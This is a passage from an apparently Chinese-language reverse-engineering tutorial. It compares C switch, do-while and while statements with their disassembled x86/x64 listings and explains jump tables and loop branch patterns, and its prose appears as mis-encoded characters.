class="hljs-number">3</span>   <br>.text:<span class="hljs-number">0000000000401573</span>                 jz      <span class="hljs-keyword">short</span> loc_401595<br>.text:<span class="hljs-number">0000000000401575</span>                 cmp     [rbp+arg_0], <span class="hljs-number">4</span><br>.text:<span class="hljs-number">0000000000401579</span>                 jz      <span class="hljs-keyword">short</span> loc_4015A1<br>.text:<span class="hljs-number">000000000040157B</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015AD<br>.text:<span class="hljs-number">000000000040157</span>D ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040157</span>D<br>.text:<span class="hljs-number">000000000040157</span>D loc_40157D:                             ; CODE XREF: myFunction+<span class="hljs-number">1B</span>â†‘j<br>.text:<span class="hljs-number">000000000040157</span>D                 mov     ecx, <span class="hljs-number">31</span>h ; <span class="hljs-string">&#x27;1&#x27;</span>  ; Character<br>.text:<span class="hljs-number">0000000000401582</span>                 call    <span class="hljs-built_in">putchar</span>   <span class="hljs-comment">//printf(&quot;1&quot;);</span><br>.text:<span class="hljs-number">0000000000401587</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">0000000000401589</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401589</span><br>.text:<span class="hljs-number">0000000000401589</span> loc_401589:                             ; CODE XREF: myFunction+Fâ†‘j<br>.text:<span class="hljs-number">0000000000401589</span>                 mov     ecx, <span class="hljs-number">32</span>h ; <span class="hljs-string">&#x27;2&#x27;</span>  ; Character<br>.text:<span class="hljs-number">000000000040158</span>E                 call    <span class="hljs-built_in">putchar</span>   <span class="hljs-comment">// printf(&quot;2&quot;);</span><br>.text:<span class="hljs-number">0000000000401593</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">0000000000401595</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401595</span><br>.text:<span class="hljs-number">0000000000401595</span> loc_401595:                             ; CODE XREF: myFunction+<span class="hljs-number">23</span>â†‘j<br>.text:<span class="hljs-number">0000000000401595</span>                 mov     ecx, <span class="hljs-number">33</span>h ; <span class="hljs-string">&#x27;3&#x27;</span>  ; Character<br>.text:<span class="hljs-number">000000000040159</span>A                 call    <span class="hljs-built_in">putchar</span>  <span class="hljs-comment">//printf(&quot;3&quot;);</span><br>.text:<span class="hljs-number">000000000040159F</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">00000000004015</span>A1 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>A1<br>.text:<span class="hljs-number">00000000004015</span>A1 loc_4015A1:                             ; CODE XREF: myFunction+<span class="hljs-number">29</span>â†‘j<br>.text:<span class="hljs-number">00000000004015</span>A1                 mov     ecx, <span class="hljs-number">34</span>h ; <span class="hljs-string">&#x27;4&#x27;</span>  ; Character<br>.text:<span class="hljs-number">00000000004015</span>A6                 call    <span class="hljs-built_in">putchar</span>  <span class="hljs-comment">//printf(&quot;4&quot;);</span><br>.text:<span class="hljs-number">00000000004015</span>AB                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">00000000004015</span>AD ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>AD<br>.text:<span class="hljs-number">00000000004015</span>AD loc_4015AD:                             ; CODE XREF: myFunction+<span class="hljs-number">1</span>Dâ†‘j<br>.text:<span class="hljs-number">00000000004015</span>AD                                         ; myFunction+<span class="hljs-number">2B</span>â†‘j<br>.text:<span class="hljs-number">00000000004015</span>AD                 lea     rcx, Format     ; <span class="hljs-string">&quot;error&quot;</span>  <span class="hljs-comment">//default:error</span><br>.text:<span class="hljs-number">00000000004015B</span>4                 call    <span class="hljs-built_in">printf</span><br>.text:<span class="hljs-number">00000000004015B</span>9<br>.text:<span class="hljs-number">00000000004015B</span>9 loc_4015B9:                             ; CODE XREF: myFunction+<span class="hljs-number">37</span>â†‘j<br>.text:<span class="hljs-number">00000000004015B</span>9                                         ; myFunction+<span class="hljs-number">43</span>â†‘j ...<br>.text:<span class="hljs-number">00000000004015B</span>9                 nop<br>.text:<span class="hljs-number">00000000004015B</span>A                 add     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">00000000004015B</span>E                 pop     rbp<br>.text:<span class="hljs-number">00000000004015B</span>F                 retn<br>.text:<span class="hljs-number">00000000004015B</span>F myFunction      endp<br></code></pre></td></tr></table></figure><h4 id="switch-åˆ†æ”¯å¤§äº7"><a href="#switch-åˆ†æ”¯å¤§äº7" class="headerlink" title="switch åˆ†æ”¯å¤§äº7"></a>switch åˆ†æ”¯å¤§äº7</h4><p>å½“switchçš„åˆ†æ”¯å¤§äº7æ—¶</p><p>è¿™æ˜¯å°è¡¨å­˜æ”¾è·³è½¬çš„ç´¢å¼• å³ edx</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202112261422135.png" alt="image-20211226142233001"></p><p>å†…å­˜ä¼šå»ºç«‹è·³è½¬è¡¨ å­˜æ”¾ æ¯ä¸ªcaseåçš„å‡½æ•°ä½“çš„èµ·å§‹åœ°å€</p><p>è¿™é‡Œçš„å¯»å€ç±»ä¼¼äºæ•°ç»„çš„å¯»å€  address=[ç¬¬ä¸€ä¸ªcaseçš„èµ·å§‹åœ°å€+4*å¯„å­˜å™¨(æ­¥é•¿)]</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202112261718094.png" alt="image-20211226171819013"></p><p>å¦‚å›¾ï¼Œå±•ç¤ºäº†å¤§è¡¨å­˜å‚¨è·³è½¬è¡¨çš„åœ°å€</p><p>å¯çŸ¥     jmp [å¯„å­˜å™¨*4 + 0xxxxx] ;è·³è½¬è¡¨æ¨¡å¼çš„é‡è¦ç‰¹å¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Function</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(x)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">233</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;233&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;8&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;9&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Function(<span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„åæ±‡ç¼–ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">4</span>:        <span class="hljs-keyword">switch</span>(x)<br><span class="hljs-number">5</span>:        &#123;<br><span class="hljs-number">0040</span>D898   mov         eax,dword ptr [ebp+<span class="hljs-number">8</span>]<br><span class="hljs-number">0040</span>D89B   mov         dword ptr [ebp<span class="hljs-number">-4</span>],eax<br><span class="hljs-number">0040</span>D89E   mov         ecx,dword ptr [ebp<span class="hljs-number">-4</span>]<br><span class="hljs-number">0040</span>D8A1   sub         ecx,<span class="hljs-number">1</span><br><span class="hljs-number">0040</span>D8A4   mov         dword ptr [ebp<span class="hljs-number">-4</span>],ecx<br><span class="hljs-number">0040</span>D8A7   cmp         dword ptr [ebp<span class="hljs-number">-4</span>],<span class="hljs-number">0E8</span>h<br><span class="hljs-number">0040</span>D8AE   ja          $L548+<span class="hljs-number">0F</span>h (<span class="hljs-number">0040</span>d950)<br><span class="hljs-number">0040</span>D8B4   mov         eax,dword ptr [ebp<span class="hljs-number">-4</span>]<br><span class="hljs-number">0040</span>D8B7   <span class="hljs-keyword">xor</span>         edx,edx<br><span class="hljs-number">0040</span>D8B9   mov         dl,<span class="hljs-function">byte <span class="hljs-title">ptr</span>  <span class="hljs-params">(<span class="hljs-number">0040</span>d996)</span>[eax]</span><br><span class="hljs-function">0040D8BF   jmp         dword ptr [edx*4+40D96Eh]    <span class="hljs-comment">//è®¡ç®—å‡ºè·³è½¬è¡¨çš„åœ°å€ ç„¶å æ ¹æ®è·³è½¬å­˜å‚¨çš„å€¼ è·³è½¬åˆ° caseè¯­å¥éƒ¨åˆ†</span></span><br><span class="hljs-function">6:        <span class="hljs-keyword">case</span> 1:</span><br><span class="hljs-function">7:            <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;1&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8C6   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;1&quot;</span> (<span class="hljs-number">0042203</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D8CB   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8D0   add         esp,4</span><br><span class="hljs-function">0040D8D3   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">8:        <span class="hljs-keyword">case</span> 2:</span><br><span class="hljs-function">9:            <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;2&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8D8   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;2&quot;</span> (<span class="hljs-number">00422038</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8DD   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8E2   add         esp,4</span><br><span class="hljs-function">0040D8E5   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">10:       <span class="hljs-keyword">case</span> 3:</span><br><span class="hljs-function">11:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;3&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8E7   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;3&quot;</span> (<span class="hljs-number">00422034</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8EC   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8F1   add         esp,4</span><br><span class="hljs-function">0040D8F4   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">12:       <span class="hljs-keyword">case</span> 4:</span><br><span class="hljs-function">13:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;4&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8F6   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;4&quot;</span> (<span class="hljs-number">00422030</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8FB   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D900   add         esp,4</span><br><span class="hljs-function">0040D903   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">14:       <span class="hljs-keyword">case</span> 5:</span><br><span class="hljs-function">15:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;5&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D905   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;5&quot;</span> (<span class="hljs-number">0042202</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D90A   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D90F   add         esp,4</span><br><span class="hljs-function">0040D912   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">16:</span><br><span class="hljs-function">17:       <span class="hljs-keyword">case</span> 233:</span><br><span class="hljs-function">18:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;233&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D914   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;12&quot;</span> (<span class="hljs-number">0042201</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D919   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D91E   add         esp,4</span><br><span class="hljs-function">0040D921   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">19:</span><br><span class="hljs-function">20:       <span class="hljs-keyword">case</span> 7:</span><br><span class="hljs-function">21:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;7&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D923   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;7&quot;</span> (<span class="hljs-number">00422028</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D928   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D92D   add         esp,4</span><br><span class="hljs-function">0040D930   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">22:       <span class="hljs-keyword">case</span> 8:</span><br><span class="hljs-function">23:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;8&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D932   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;10&quot;</span> (<span class="hljs-number">00422024</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D937   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D93C   add         esp,4</span><br><span class="hljs-function">0040D93F   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">24:       <span class="hljs-keyword">case</span> 9:</span><br><span class="hljs-function">25:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;9&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D941   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;11&quot;</span> (<span class="hljs-number">00422020</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D946   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D94B   add         esp,4</span><br><span class="hljs-function">0040D94E   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">26:       <span class="hljs-keyword">default</span>:</span><br><span class="hljs-function">27:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;error&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D950   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;error&quot;</span> (<span class="hljs-number">00422f</span>cc)<br><span class="hljs-number">0040</span><span class="hljs-function">D955   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D95A   add         esp,4</span><br><span class="hljs-function">28:</span><br><span class="hljs-function">29:       &#125;</span><br><span class="hljs-function">30:   &#125;</span><br></code></pre></td></tr></table></figure><h3 id="dowhile"><a href="#dowhile" class="headerlink" title="dowhile"></a>dowhile</h3><p>ç‰¹ç‚¹ï¼š</p><p>â€‹    å‘ä¸Šè·³è½¬ï¼ˆåˆ†æ”¯è¯­å¥éƒ½æ˜¯å‘ä¸Šè·³è½¬ï¼‰</p><p>â€‹    è·³è½¬æ¡ä»¶ä¸åå†™</p><p>â€‹    åªç”¨ä¸€æ¬¡è·³è½¬ï¼Œæ•ˆç‡æœ€é«˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> <br>    &#123;<br>        nSum = nSum + i;<br>    &#125; <span class="hljs-keyword">while</span> (i &lt;=<span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ±‡ç¼–ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>â†‘p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>Câ†“o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main       <span class="hljs-comment">//mainå¼€å§‹</span><br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>   <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">0</span>  <span class="hljs-comment">//b=0</span><br>.text:<span class="hljs-number">0000000000401572</span><br>.text:<span class="hljs-number">0000000000401572</span> loc_401572:                             ; CODE XREF: main+<span class="hljs-number">2</span>Câ†“j<br>.text:<span class="hljs-number">0000000000401572</span>                 mov     eax, [rbp+var_8]  <span class="hljs-comment">//eax=b</span><br>.text:<span class="hljs-number">0000000000401575</span>                 add     [rbp+var_4], eax  <span class="hljs-comment">//a=a+b</span><br>.text:<span class="hljs-number">0000000000401578</span>                 cmp     [rbp+var_8], <span class="hljs-number">64</span>h ; <span class="hljs-string">&#x27;d&#x27;</span>  <br>.text:<span class="hljs-number">000000000040157</span>C                 jle     <span class="hljs-keyword">short</span> loc_401572     <br>.text:<span class="hljs-number">000000000040157</span>E                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401583</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401587</span>                 pop     rbp<br>.text:<span class="hljs-number">0000000000401588</span>                 retn<br>.text:<span class="hljs-number">0000000000401588</span> main            endp<br></code></pre></td></tr></table></figure><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p>â€‹    while è¦å…ˆæ¯”è¾ƒï¼Œå†è·³è½¬ï¼Œä¸€å…±ä¸¤æ¬¡ï¼Œæ•ˆç‡è¾ƒä½ å…¶ä¸­ç¬¬ä¸€æ¬¡è·³è½¬å…¶åœ°å€æ˜¯å¾€å¢é‡è·³è½¬,ç¬¬äºŒæ¬¡è·³è½¬å…¶åœ°å€æ˜¯å¾€å‡é‡åœ°å€è·³è½¬</p><p>â€‹    Releaseç‰ˆæœ¬ä¸‹</p><p>ã€€ã€€1.å¸¸é‡ä¼ æ’­çš„ä¼˜åŒ–æ–¹å¼ä¸‹,å…¶ä»£ç ä¼šå˜æˆdo whileæ‰§è¡Œ</p><p>ã€€ã€€2.ä»£ç å¤–æçš„æƒ…å†µä¸‹,å…¶ä»£ç ä¼šå˜æˆif åŒ…å« do whileæ‰§è¡Œ,å…¶ä¸­ä»£ç çš„æ¡ä»¶å¤–æ.æ³¨æ„,å‡½æ•°ä¸å¯ä»¥ä½œä¸ºä»£ç å¤–æ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i &lt;= <span class="hljs-number">100</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,nSum);<br>        nSum = nSum + i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> argc;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”åæ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>â†‘p<br>.text:<span class="hljs-number">0000000000401550</span>                             